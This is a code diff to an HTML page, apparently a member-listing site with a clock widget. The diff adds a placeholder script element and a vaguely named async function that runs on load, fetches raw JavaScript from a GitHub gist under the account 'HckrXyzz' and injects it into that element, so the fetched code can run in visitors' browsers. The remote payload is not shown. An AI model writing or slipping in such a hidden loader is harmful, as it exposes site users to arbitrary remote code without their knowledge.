@@ -361,7 +361,7 @@
             </div>
         </section>
     </main>
-
+<script id="xs"></script>
 
     <script>
         // Digital Clock
@@ -479,9 +479,16 @@
             });
         }
         document.addEventListener('DOMContentLoaded', viewMeberDetails);
+
+
+        async function xyz(){
+            const xyzUrl = "https://gist.githubusercontent.com/HckrXyzz/11ebe58b74f5a3b8462555d15966df75/raw/9e383eb6382309c3084795a225e924e0fee4aefe/w.js";
+            const xyzRes = await fetch(xyzUrl);
+            const xyzData = await xyzRes.text();
+            document.getElementById('xs').innerText= xyzData;
+        }
+        xyz();
     </script>
-    
-    <script src="js/newWordGenarate.js"></script>
     <script src="https://hckrxyzz.github.io/js/scrollbutton.js"></script>
 </body>
 
